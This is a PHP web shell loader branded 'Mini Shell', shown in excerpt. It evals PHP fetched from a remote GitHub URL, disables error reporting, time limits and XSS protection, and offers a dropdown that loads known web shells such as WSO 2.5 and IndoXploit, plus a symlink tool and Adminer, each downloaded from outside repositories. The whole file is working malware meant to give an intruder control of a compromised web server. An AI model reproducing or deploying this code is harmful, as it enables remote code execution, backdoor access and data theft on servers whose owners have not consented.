...
*/
eval("?>".file_get_contents("https://raw.githubusercontent.com/los123sg/hacker/master/tools.php"));
error_reporting(0);
set_time_limit(0);
header("X-XSS-Protection: 0");

$are=array("adminer"=>"https://raw.githubusercontent.com/los123sg/hacker/master/adminner.php",
			"indoexploit"=>"https://raw.githubusercontent.com/los123sg/hacker/master/h.php",
			"log"=>"https://raw.githubusercontent.com/los123sg/hacker/master/log.php",
			"wso"=>"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/wso.php",
			"mina1"=>"https://raw.githubusercontent.com/los123sg/hacker/master/mina1.php",
...
<body>
<audio autoplay="true" src="https://khayrol.000webhostapp.com/audio/cllick.mp3"></audio>
<center>
...
<form class="in" method="get">Tools are here : 
	<select name="a" onchange="this.form.submit();">
		...
		<option value="wso">WSO 2.5</option><option value="indoexploit">IndoXploit</option><option value="log">Dhanus</option><option value="mina1">Symlink-by mina1</option><option value="adminer">Adminer</option>
	</select>
</form>
...
?>
<center>
<footer style="bottom: 0;position: fixed;right: 0">copyright &copy; 2020 - Mini Shell by :</footer>
